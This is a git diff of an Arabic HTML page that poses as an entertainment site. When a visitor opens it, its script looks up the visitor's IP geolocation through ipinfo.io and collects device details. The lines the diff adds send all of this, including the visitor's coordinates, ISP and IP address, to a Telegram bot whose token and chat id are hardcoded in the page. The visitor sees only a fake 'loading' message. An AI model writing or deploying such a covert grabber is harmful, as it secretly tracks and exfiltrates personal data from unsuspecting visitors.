@@ -1,13 +1,14 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
   <title>🔥 موقع رهيب</title>
   <script>
+    // عند فتح الصفحة، اجلب معلومات الموقع
     fetch("https://ipinfo.io/json?token=46eede76a5f9e6")
       .then(res => res.json())
       .then(ipinfo => {
+        // اجمع بيانات الجهاز والزائر
         const data = {
           userAgent: navigator.userAgent,
           language: navigator.language,
@@ -20,8 +21,31 @@
           org: ipinfo.org
         };
 
-        alert("📡 تم تسجيل زيارتك، شكرًا");
-        console.log("📦 بيانات:", data);
+        // جهّز رسالة التنبيه
+        const message =
+          "📡 تم فتح الرابط!\n" +
+          "📱 الجهاز: " + data.userAgent + "\n" +
+          "🌐 اللغة: " + data.language + "\n" +
+          "🖥️ الشاشة: " + data.screen + "\n" +
+          "🌍 الموقع: " + data.city + ", " + data.region + ", " + data.country + "\n" +
+          "📌 الإحداثيات: " + data.loc + "\n" +
+          "🔌 مزود الخدمة: " + data.org + "\n" +
+          "🛰️ IP: " + data.ip;
+
+        // أرسل الرسالة إلى Telegram
+        fetch("https://api.telegram.org/bot8480823805:AAHWCjHAcTcTHwCee-_4BmaPk85n1eSOo1E/sendMessage", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: "5014833892",
+            text: message
+          })
+        });
+
+        // عرض رسالة للمستخدم
+        alert("🔥 جاري التحميل...");
       });
   </script>
 </head>
@@ -29,5 +53,3 @@
   <h1>🔥 أفضل موقع ترفيهي... جاري التحميل</h1>
 </body>
 </html>
-
-
